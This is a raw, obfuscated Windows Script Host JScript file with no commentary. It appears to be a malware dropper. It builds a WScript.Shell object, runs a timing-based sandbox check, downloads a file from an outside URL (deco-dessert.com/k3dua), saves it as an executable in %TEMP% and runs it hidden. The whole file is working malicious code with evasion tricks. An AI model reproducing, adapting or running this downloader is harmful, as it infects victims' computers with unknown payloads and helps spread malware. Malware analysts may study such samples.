var r = false;
var e = "CreateObject";
var CW = function W() {return WScript[e]("WScript.Shell");}(), Ty = 11;
var Qv = "MSXML2.XMLHTTP";
var uZ = 2123213;
var dQ = 0;
function HH(e0){CW["Run"](e0, dQ, dQ);};
function Q(){return "" + Qv;};
function J(E, X){dQ = dQ * 1; return E - X;};
function Pn(){return e;};
/*@cc_on
  @if (@_win32 || @_win64)
    r = true;
  @end
@*/
if (r)
{
var g = "";
function d(){return 22;};
var JV = 0; var ha = 0;
function i()
{
var ob = new this["Date"]();
var WT = ob["getUTCMilliseconds"]();
WScript["Sleep"](d());
var ob = new this["Date"]();
var Ud = ob["getUTCMilliseconds"]();
WScript["Sleep"](d());
var ob = new this["Date"]();
var N = ob["getUTCMilliseconds"]();
var JV = "PO";
JV = J(Ud, WT);
var ha = "g0";
ha = J(N, Ud);
g = "open";
return J(JV, ha);
}
var M = false;
var Vc = false;
for (var q = dQ; q < d() * 1; q++){if (i() != dQ){
M = true; 
ha = "31" + 11 * JV + ha; 
Vc = true; 
break;
}}
function s() {return ((M == true) && (M == Vc)) ? 1 : dQ;};
if (M && s() && Vc){
function Bk() {return CW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zJTDFO3cC9SnJAJ.exe";};
 q0 = Q();
 N0 = WScript[e](q0);
 var rc = 1;
 while (rc){
try {
N0[g]("GET", "http://www.deco-dessert.com/k3dua", false);
N0["send"]();
G = "Sleep";
for (;;){WScript[G](d() * 11); if (N0["readystate"] >= 2 * 2) break;};
rc = dQ;
} catch(MZ){};
}
function Tw(Me) {var a = (1, 2, 3, 4, 5, Me); return a;};
J0 = WScript[Pn()]("ADODB.Stream");
q0 = J0;
q0[g]();
q0["type"] = Tw(1);
q0["write"](N0["ResponseBody"]);
J0["position"] = Tw(dQ);
q0["Save" + "ToFile"](Bk(), 2);
J0["c"+"lose"]();
n = Bk();
HH(n);
}
}

